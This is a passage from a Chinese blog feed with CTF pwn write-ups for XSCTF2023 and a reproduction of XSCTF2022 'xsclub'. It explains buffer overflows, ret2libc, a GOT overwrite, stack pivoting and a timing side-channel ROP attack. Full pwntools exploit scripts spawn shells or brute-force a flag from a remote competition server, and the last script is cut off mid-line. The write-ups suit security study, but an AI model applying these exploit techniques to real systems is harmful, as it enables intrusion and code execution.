          <category> 大学课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 作业 </tag>
            
            <tag> 操作系统 </tag>
            
            <tag> 实验 </tag>
            
            <tag> 进程调度算法 </tag>
            
            <tag> 进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF2023</title>
      <link href="/2024/10/28/XSCTF2023/"/>
      <url>/2024/10/28/XSCTF2023/</url>
      
        <content type="html"><![CDATA[<h1 id="2023XSCTF热身赛"><a href="#2023XSCTF热身赛" class="headerlink" title="2023XSCTF热身赛"></a>2023XSCTF热身赛</h1><h2 id="XSCTF2022-xsclub复现"><a href="#XSCTF2022-xsclub复现" class="headerlink" title="XSCTF2022 xsclub复现"></a>XSCTF2022 xsclub复现</h2><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1696692757504-1f780a22-eec0-484a-9b40-96d4d8f8baf2.png" alt="img"></p><p>有点逆天，保护除了canary都是绿的</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1696816717188-7520ca23-6118-4207-a408-1aa9ed710a5c.png" alt="img"></p><p>前面有个base64，直接复制上去code就行</p><p>开了沙盒，禁了后门函数，关闭了标准输入和标准输出流，后面要改一下重定向，开了pie还要先泄露地址再rop，真的逆天啊。</p><p>基本上确定是ORW，直接ROP链构造shellcode？</p><p>注意这里是gets不能够逐字节绕过pie</p><h3 id="会议回放"><a href="#会议回放" class="headerlink" title="会议回放"></a>会议回放</h3><p>利用printf泄露pie</p><p>base64解码可以输入32字节，为了在后面继续输入点东西我们使用\x00截断，由于我们后续open会调用”flag”字符串的地址，所以我们要在这里写入“flag”，写完之后是这样”\x00flag\x00”共6个字节。那还剩下一个字节可以写读取我们的flag(flag{114514_1919810})的任何一个字符如”{“到此处进行比较</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1696785775875-2f32e2c7-27b9-44ed-9595-82106a3560f7.png" alt="img"></p><p>找到隐藏的syscallgadget，在main上面，上面东西越多，越有可能藏gadgets</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1696783970011-13907f8e-66fe-4f86-bf15-732aa5d61273.png" alt="img"></p><p>此处侧信道使用宏观函数模拟微观汇编的功能</p><p>strcmp比较两个字符串，需要两个参数，返回这两个字符串的ASCII码差值给rax，这很方便我们syscall</p><p>我们再用原本函数给出的一个gadget片段来模拟cmp</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1696844945249-fe1149c4-d391-41d5-ad3c-386889eea01c.png" alt="img"></p><p>最后的timeouts怎么去模拟呢？我们可以通过一些pause等函数来进入休眠状态来模拟。</p><p>我们用strcmp比较我们放在code最后一字节的我们写入的字符和我们open然后read到bss段上的flag，如果相同则返回0，这样就会跳到9A8执行ret，返回到pause。否则就会jmp rax程序报错。</p><p>如果我们接受timeout&#x3D;0.25，就说明flag比对正确，输出flag。</p><p>我们一直执行，知道我们flag全部打印出来</p><p>如何泄露pie，我们可以看到在两个不同的libc版本，我们的rsi不同，20.04成功泄露，但是22.04不行，这是因为不同libc版本</p><p>这里是ubuntu20.04</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1696815124395-73860f84-c4c1-41e3-80ef-e966fe0aba97.png" alt="img"></p><p>这里是ubuntu22.04<img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1696815136155-13ecdd9f-8410-47c9-8a83-3e0ea0f148ce.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> signal </span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;club&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">signum, frame</span>):</span><br><span class="line">    <span class="keyword">raise</span> TimeoutError()<span class="comment">#抛出异常</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">try_c, flag_len</span>):</span><br><span class="line">    <span class="comment"># io = process(&#x27;./club&#x27;)</span></span><br><span class="line">    <span class="comment"># io = remote(&#x27;127.0.0.1&#x27;, 9999)</span></span><br><span class="line">    io = remote(<span class="string">&#x27;43.248.98.206&#x27;</span>, <span class="number">10075</span>)</span><br><span class="line">    io.sendafter(<span class="string">&#x27; is XS-Club, your name?\n&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#只发送一个a，因为printf上面会有残留地址</span></span><br><span class="line">    signal.signal(signal.SIGALRM, handler)</span><br><span class="line">    signal.alarm(<span class="number">1</span>)<span class="comment">#在1秒钟后触发 SIGALRM 信号。</span></span><br><span class="line">    <span class="comment">#当定时器时间到达时，会触发 SIGALRM 信号，从而调用 handler 函数。</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;Okay, &#x27;</span>)</span><br><span class="line">        signal.alarm(<span class="number">0</span>)<span class="comment">#函数将信号处理程序设置为默认操作。这意味着如果超时发生，将执行默认的信号处理操作。</span></span><br><span class="line">        signal.signal(signal.SIGALRM, signal.SIG_DFL)</span><br><span class="line">        <span class="comment">#如果在接收数据的过程中没有发生异常，那么超时定时器会被取消，然后代码继续执行后面的操作。</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        signal.alarm(<span class="number">0</span>)</span><br><span class="line">        signal.signal(signal.SIGALRM, signal.SIG_DFL)</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    pie_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x561d75601161</span> - <span class="number">0x561d75600000</span>)</span><br><span class="line">    strcmp_plt = pie_base + elf.plt[<span class="string">&#x27;strcmp&#x27;</span>]</span><br><span class="line">    read_plt = pie_base + elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    read_got = pie_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    pop_rdi = pie_base + <span class="number">0x00000000000011a3</span></span><br><span class="line">    pop_rsi_r15 = pie_base + <span class="number">0x00000000000011a1</span></span><br><span class="line">    syscall = pie_base + <span class="number">0x00000000000009f5</span></span><br><span class="line">    set_rdx_10 = pie_base + <span class="number">0x00000000000009f7</span></span><br><span class="line">    csu1 = pie_base + <span class="number">0x000000000000119A</span></span><br><span class="line">    csu2 = pie_base + <span class="number">0x0000000000001180</span></span><br><span class="line">    bss_start = pie_base + <span class="number">0x0000000000202020</span></span><br><span class="line">    flag_str_addr = pie_base + <span class="number">0x000000000020207a</span></span><br><span class="line">    try_chr_addr = pie_base + <span class="number">0x000000000020207f</span></span><br><span class="line">    target_chr_addr = bss_start + <span class="number">0x300</span></span><br><span class="line">    set_rax_2 = flat([  <span class="comment">#open</span></span><br><span class="line">        pop_rdi,</span><br><span class="line">        pie_base + <span class="number">0x00000000000011E7</span>,<span class="comment">#从base64字符串中挑出来的&#x27;Y&#x27; 59</span></span><br><span class="line">        pop_rsi_r15,</span><br><span class="line">        pie_base + <span class="number">0x00000000000015A0</span>,<span class="comment">#从printf打印的字符串拿出&#x27;W&#x27; 57</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        strcmp_plt</span><br><span class="line">    ])</span><br><span class="line">    set_rax_0x22 = flat([   <span class="comment">#pause</span></span><br><span class="line">        pop_rdi,</span><br><span class="line">        pie_base + <span class="number">0x00000000000011EF</span>,<span class="comment">#&#x27;y&#x27; 79</span></span><br><span class="line">        pop_rsi_r15,</span><br><span class="line">        pie_base + <span class="number">0x00000000000015A0</span>,<span class="comment">#&#x27;W&#x27; 57</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        strcmp_plt</span><br><span class="line">    ])</span><br><span class="line">    test_gadget = pie_base + <span class="number">0x000000000000099B</span></span><br><span class="line"></span><br><span class="line">    io.sendafter(<span class="string">&#x27; code\n&#x27;</span>, flat([base64.b64decode(<span class="string">&#x27;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==&#x27;</span>), <span class="string">&#x27;\x00flag\x00&#x27;</span>, try_c]))</span><br><span class="line"><span class="comment">#try_c 我们测试对比用的字符放在这里</span></span><br><span class="line">    rop_chain = flat([</span><br><span class="line">        set_rax_2,</span><br><span class="line">        pop_rdi,</span><br><span class="line">        flag_str_addr,</span><br><span class="line">        pop_rsi_r15,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        syscall,</span><br><span class="line">        csu1,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        read_got, </span><br><span class="line">        <span class="number">0</span>,  <span class="comment">#edi</span></span><br><span class="line">        target_chr_addr,    <span class="comment">#rsi #写到的是bss段上的一个地方</span></span><br><span class="line">        flag_len + <span class="number">1</span>,   <span class="comment">#rdx #一个字节一个字节来读入？</span></span><br><span class="line">        csu2,</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span>,</span><br><span class="line">        pop_rdi,</span><br><span class="line">        try_chr_addr,<span class="comment">#测试用的地方</span></span><br><span class="line">        pop_rsi_r15,</span><br><span class="line">        target_chr_addr + flag_len,<span class="comment">#bss段上的一个地方+offset</span></span><br><span class="line">        <span class="number">0</span>,<span class="comment">#r15</span></span><br><span class="line">        strcmp_plt,</span><br><span class="line">        test_gadget,</span><br><span class="line">        set_rax_0x22,</span><br><span class="line">        syscall</span><br><span class="line">    ])</span><br><span class="line">    <span class="keyword">if</span> flag_len == <span class="number">9</span>:</span><br><span class="line">        rop_chain = flat([</span><br><span class="line">            set_rax_2,    </span><br><span class="line">            pop_rdi,      </span><br><span class="line">            flag_str_addr,</span><br><span class="line">            pop_rsi_r15,  </span><br><span class="line">            <span class="number">0</span>,            </span><br><span class="line">            <span class="number">0</span>,            </span><br><span class="line">            syscall,      </span><br><span class="line">            pop_rdi,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            pop_rsi_r15,</span><br><span class="line">            target_chr_addr,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            set_rdx_10,</span><br><span class="line">            read_plt,</span><br><span class="line">            pop_rdi,                   </span><br><span class="line">            try_chr_addr,              </span><br><span class="line">            pop_rsi_r15,               </span><br><span class="line">            target_chr_addr + flag_len,</span><br><span class="line">            <span class="number">0</span>,                         </span><br><span class="line">            strcmp_plt,                </span><br><span class="line">            test_gadget,               </span><br><span class="line">            set_rax_0x22,              </span><br><span class="line">            syscall                    </span><br><span class="line">        ])</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27; leave your phone number here\n&#x27;</span>, flat(&#123;<span class="number">0x28</span>: rop_chain&#125;))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;~\nNow you can join the club, go crazy!!! *\\(^o^)/*\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#123;&#125;-_@$&amp;*!?.&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">t = time.time()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">if</span> pwn(c, <span class="built_in">len</span>(flag)):</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">        success(flag)</span><br><span class="line">        <span class="comment">#success(flat([&#x27;time: &#x27;, str(round(time.time() - t, 2)), &#x27;s&#x27;]))</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        info(flag)</span><br><span class="line">        <span class="comment">#info(flat([&#x27;time: &#x27;, str(round(time.time() - t, 2)), &#x27;s&#x27;]))</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><h1 id="2023XSCTF"><a href="#2023XSCTF" class="headerlink" title="2023XSCTF"></a>2023XSCTF</h1><h2 id="【新生专属】chatgpt"><a href="#【新生专属】chatgpt" class="headerlink" title="【新生专属】chatgpt"></a>【新生专属】chatgpt</h2><p>ret2libc和strlen的绕过，strlen会根据b’\x00’截断字符串，来判断字符串长度，只要我们padding都是b’\x00’，那就无关紧要doge，这里也没有canary和pie保护，常规的ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,29649)</span></span><br><span class="line">p=process(<span class="string">&#x27;./chatgpt&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;chatgpt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00401503</span></span><br><span class="line">put_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret_addr = <span class="number">0x401416</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;put_plt:&quot;</span>,<span class="built_in">hex</span>(put_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;put_got:&quot;</span>,<span class="built_in">hex</span>(put_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;main_addr:&quot;</span>,<span class="built_in">hex</span>(main_addr))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak put_got addr and return to put_leak&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice: \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">put_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr&quot;</span>,<span class="built_in">hex</span>(put_addr))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;puts&#x27;,put_addr)</span></span><br><span class="line">libcbase = put_addr-<span class="number">0x084420</span><span class="comment">#libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line">system_addr=libcbase+<span class="number">0x052290</span><span class="comment">#libc.dump(&#x27;system&#x27;)</span></span><br><span class="line">binsh_addr=libcbase+<span class="number">0x1b45bd</span><span class="comment">#libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase =&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr =&quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh_addr =&quot;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice: \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">payload2=<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x28</span>+p64(ret_addr)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="【新生专属】babystack"><a href="#【新生专属】babystack" class="headerlink" title="【新生专属】babystack"></a>【新生专属】babystack</h2><p>第一个漏洞是读入int类型，进入函数的时候会转换成unsigned int类型，如果我们输入是-1，那就会转换成0XFFFFFFFF表示的10进制，这样就可以绕过判断。之后就是常规的ret2rip，如果遇到栈平衡的问题，可以在payload里面加一个p64(ret)，或者返回到backdoor函数的后几个字节（主要是跳过puhs rbp）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x40124C</span> </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(ret)+p64(<span class="number">0x4012b7</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="【新生专属】babypwn"><a href="#【新生专属】babypwn" class="headerlink" title="【新生专属】babypwn"></a>【新生专属】babypwn</h2><p>其实开不开pie没什么影响</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697732848392-6cbff195-a9bf-4a1d-aa9d-dba4b694dd94.png" alt="img"></p><p>数组下界溢出修改got表</p><p>观察到数据写入到bss段，然后计算输入点和exit_got表的偏移，覆盖exit_got为backdoor后门函数，返回程序就可以getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./babypwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29750)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babypwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">backdoor=<span class="number">0x401330</span></span><br><span class="line">BOSS=<span class="number">0X4040C0</span></span><br><span class="line">puts_got=<span class="number">0x404018</span></span><br><span class="line">exit_got=<span class="number">0x404058</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;xswlhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">off=<span class="built_in">int</span>((exit_got-BOSS)/<span class="number">8</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(off))</span><br><span class="line"></span><br><span class="line">payload=p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="signin-1-和2"><a href="#signin-1-和2" class="headerlink" title="signin 1 和2"></a>signin 1 和2</h2><h2 id="【复现】I-want-2-leave"><a href="#【复现】I-want-2-leave" class="headerlink" title="【复现】I_want_2_leave"></a>【复现】I_want_2_leave</h2><h3 id="0X1-分析"><a href="#0X1-分析" class="headerlink" title="0X1 分析"></a>0X1 分析</h3><p>解题人：xswlhhh</p><p>解题的时候不小心重置快照，exp没保存又写一遍，之后又重写，调了好久才通了</p><p>这里它设置了一个global_canary。我们需要去泄露他，然后循环条件是v2&lt;&#x3D;0，我们要在栈上设置v2的数字并且泄露canary，这里有点讲究</p><p>我们本地测试canary.txt是8位的，p.send就可以泄露canary和rbp。事实上远程也是8位的，不过也可以一步一步来，先泄露canary，再来rbp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p32(<span class="number">0xFFFFFF66</span>)+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>至于这里接收用什么这主要看你用什么数据，怎么去调整接收到的数据</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697445542752-fd5aa9ca-6aa0-410f-8e4c-5761d02c4e8f.png" alt="img"></p><p>这里我们上面说了，第一次就把canary和rbp给泄露了</p><p>我们看到藏了个system函数</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697446010793-b80a192e-6658-4ea6-9968-45687592ee81.png" alt="img"></p><p>而且它给的栈溢出空间太小了，只能覆盖到RBP和RET(rip)，所以这里栈迁移到栈上，刚好”&#x2F;bin&#x2F;sh\x00”八字节，刚好住了pop了一个8的位置，而且地址也在栈顶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(pop_rdi)+p64(stack)+p64(ret)+p64(<span class="number">0x401124</span>)+p64(<span class="number">0x401124</span>)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload1+=p32(<span class="number">0x1</span>)+<span class="string">b&#x27;bbbb&#x27;</span>+p64(canary)</span><br><span class="line">payload1+=p64(stack)+p64(leave_ret)</span><br></pre></td></tr></table></figure><p>最后本地通了，貌似远程有问题？</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697445550928-8a55b278-6b76-49ef-9499-bd837754e141.png" alt="img"></p><h3 id="0X3-exp"><a href="#0X3-exp" class="headerlink" title="0X3 exp"></a>0X3 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;43.248.97.200&quot;,40061)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system_got=<span class="number">0x404038</span></span><br><span class="line">pop_rdi=<span class="number">0x4014d3</span></span><br><span class="line">leave_ret=<span class="number">0x401469</span></span><br><span class="line">ret=<span class="number">0x401432</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p32(<span class="number">0xFFFFFF66</span>)+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span 